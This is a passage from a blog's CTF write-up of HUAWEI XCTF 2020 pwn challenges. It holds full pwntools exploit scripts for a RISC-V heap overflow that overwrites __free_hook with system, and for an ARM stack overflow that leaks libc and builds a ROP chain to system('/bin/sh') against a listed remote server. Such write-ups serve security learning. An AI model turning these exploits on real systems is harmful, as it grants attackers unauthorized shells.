<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> b<span class="token string">'touch '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> b<span class="token string">'rm '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'cat '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">echo</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> n<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'echo '</span> <span class="token operator">+</span> t <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>d<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">quit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># leak libc</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        touch<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        rm<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        touch<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    touch<span class="token punctuation">(</span>b<span class="token string">'7'</span><span class="token punctuation">)</span>
    echo<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token string">'&amp;'</span><span class="token punctuation">)</span>
    cat<span class="token punctuation">(</span><span class="token string">'7'</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span> <span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token number">0x0000004000000000</span> <span class="token operator">+</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>
    li<span class="token punctuation">(</span><span class="token string">'leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    touch<span class="token punctuation">(</span>b<span class="token string">'debug'</span><span class="token punctuation">)</span>
    csu_c <span class="token operator">=</span> <span class="token number">0x0001181a</span>
    csu_i <span class="token operator">=</span> <span class="token number">0x0001182c</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xed4b0</span>
    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'system: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#rm(b'8')</span>

    touch<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>
    touch<span class="token punctuation">(</span>b<span class="token string">'b'</span><span class="token punctuation">)</span>
    echo<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#echo('>', 'b', 'B' * 0x100)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> b<span class="token string">'b'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
    echo<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span>  p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># heap overflow</span>
    li<span class="token punctuation">(</span><span class="token string">'__free_hook: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    echo<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#touch(b'debug')</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./qemu-riscv64'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span> <span class="token punctuation">,</span> <span class="token string">'./libs'</span><span class="token punctuation">,</span> elf_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#io = process(['./qemu-riscv64', '-g', '1234', '-L' , './libs', elf_path])</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./qemu-riscv64'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span> <span class="token punctuation">,</span> <span class="token string">'./libs'</span><span class="token punctuation">,</span> elf_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#io = process(['./qemu-riscv64', '-g', '1234', '-L' , './libs', elf_path])</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="pwnit"><a href="#pwnit" class="headerlink" title="pwnit"></a>pwnit</h3><h3 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h3><pre><code>    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)</code></pre>
<h3 id="vul-2"><a href="#vul-2" class="headerlink" title="vul"></a>vul</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  char buf[260]; // [sp+0h] [bp-104h] BYREF

  setvbuf((FILE *)stdout, 0, 2, 0);
  printf(&quot;input: &quot;);
  read(0, buf, 0x300u);
  return 0;
&#125;</code></pre>
<p>It’s easy to found the vul. use arm gadget to exploit it! so we must leak libc before modify something</p>
<p>Use print print.got table to leak</p>
<pre class=" language-python"><code class="language-python">    main <span class="token operator">=</span> <span class="token number">0x000104A0</span>
    <span class="token comment" spellcheck="true">#gadget_2 = 0x000104F8 #  MOV R0, R3;SUB SP, R11, #4; POP {R11,PC}</span>
    gadget_1 <span class="token operator">=</span> <span class="token number">0x00010348</span> <span class="token comment" spellcheck="true"># pop {r3, pc}</span>
    gadget_2 <span class="token operator">=</span> <span class="token number">0x000104D8</span> <span class="token comment" spellcheck="true"># printf</span>
    gadget_3 <span class="token operator">=</span> <span class="token number">0x00010500</span> <span class="token comment" spellcheck="true"># pop {R11,PC}</span>
    gadget_4 <span class="token operator">=</span> <span class="token number">0x000104F8</span>
    p <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x104</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_1<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_3<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># r11</span>
    <span class="token comment" spellcheck="true">#p += p32(elf.plt['printf'])</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_2<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#li('ru')</span>
    sla<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span></code></pre>
<p>So we can leak libc address, but we found that the address not change by every attack, so the aslr protector is off</p>
<p>Next attack, we just use modifying r0 regiseter gadget in libc to create a system(“/bin/sh”) rop chain to get shell</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: i0gan</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

elf_path  <span class="token operator">=</span> <span class="token string">'./bin'</span>
<span class="token comment" spellcheck="true">#libc_path = '/glibc/2.23/64/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'./libc-2.31.so'</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"139.159.210.220"</span>
server_port <span class="token operator">=</span> <span class="token number">9999</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    main <span class="token operator">=</span> <span class="token number">0x000104A0</span>
    <span class="token comment" spellcheck="true">#gadget_2 = 0x000104F8 #  MOV R0, R3;SUB SP, R11, #4; POP {R11,PC}</span>
    gadget_1 <span class="token operator">=</span> <span class="token number">0x00010348</span> <span class="token comment" spellcheck="true"># pop {r3, pc}</span>
    gadget_2 <span class="token operator">=</span> <span class="token number">0x000104D8</span> <span class="token comment" spellcheck="true"># printf</span>
    gadget_3 <span class="token operator">=</span> <span class="token number">0x00010500</span> <span class="token comment" spellcheck="true"># pop {R11,PC}</span>
    gadget_4 <span class="token operator">=</span> <span class="token number">0x000104F8</span>
    libc_base <span class="token operator">=</span> <span class="token number">0xff6db39c</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xfe861</span>
    gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0006beec</span> <span class="token comment" spellcheck="true"># pop {r0, r4, pc}</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    bss <span class="token operator">=</span> <span class="token number">0x00020F08</span>
    <span class="token triple-quoted-string string">'''
    # leak
    p = b'A' * 0x104
    p += p32(gadget_1)
    p += p32(elf.got['printf'])
    p += p32(gadget_3)
    p += p32(1) # r11
    #p += p32(elf.plt['printf'])
    p += p32(gadget_2)
    #li('ru')
    sla('input:', p)
    '''</span>
    p <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x100</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># r11</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libc_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">i0gan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.i0gan.cn/2021/01/08/wp-huawei-xctf-2020/">http://blog.i0gan.cn/2021/01/08/wp-huawei-xctf-2020/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="/img/text_bg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/01/wp-hws/"><img class="prev-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">HWS PWN WRITE UP</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/06/axb2020/"><img class="next-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Some small records of the I-SOON Cup Of CUIT CTF Competition final</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/09/02/wp-2020-ciscn/" title="2020 CISCN PWN WP"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="title">2020 CISCN PWN WP</div></div></a></div><div><a href="/2020/09/01/wp-2020-qwb/" title="wp 2020强网杯"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-01</div><div class="title">wp 2020强网杯</div></div></a></div><div><a href="/2020/09/22/wp-down-under-ctf/" title="wp DownUnderCTF"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-22</div><div class="title">wp DownUnderCTF</div></div></a></div><div><a href="/2020/06/18/wp-hfb-2020/" title="wp-hfb-2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-18</div><div class="title">wp-hfb-2020</div></div></a></div><div><a href="/2020/09/26/wp-jk-2020/" title="极客巅峰2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-26</div><div class="title">极客巅峰2020</div></div></a></div><div><a href="/2020/11/06/wp-nssc-2020/" title="NSSC 2020 CTF"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-06</div><div class="title">NSSC 2020 CTF</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">i0gan</div><div class="author-info__description">Even if a man has reached the top, he still needs to improve himself</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/i0gan"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-PWN-WRITE-UP"><span class="toc-number">1.</span> <span class="toc-text">HUAWEI XCTF 2020 PWN WRITE UP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-First"><span class="toc-number">2.</span> <span class="toc-text">HUAWEI XCTF 2020 First</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CPP"><span class="toc-number">2.1.</span> <span class="toc-text">CPP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">2.1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-Second"><span class="toc-number">3.</span> <span class="toc-text">HUAWEI XCTF 2020 Second</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#honorbook"><span class="toc-number">3.1.</span> <span class="toc-text">honorbook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-Third"><span class="toc-number">4.</span> <span class="toc-text">HUAWEI XCTF 2020 Third</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell"><span class="toc-number">4.1.</span> <span class="toc-text">shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vul"><span class="toc-number">4.1.2.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb-script"><span class="toc-number">4.1.3.</span> <span class="toc-text">gdb script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">4.1.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell2"><span class="toc-number">4.2.</span> <span class="toc-text">shell2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-2"><span class="toc-number">4.2.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vul-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb-script-1"><span class="toc-number">4.2.3.</span> <span class="toc-text">gdb script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">4.2.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnit"><span class="toc-number">4.2.5.</span> <span class="toc-text">pwnit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-3"><span class="toc-number">4.2.6.</span> <span 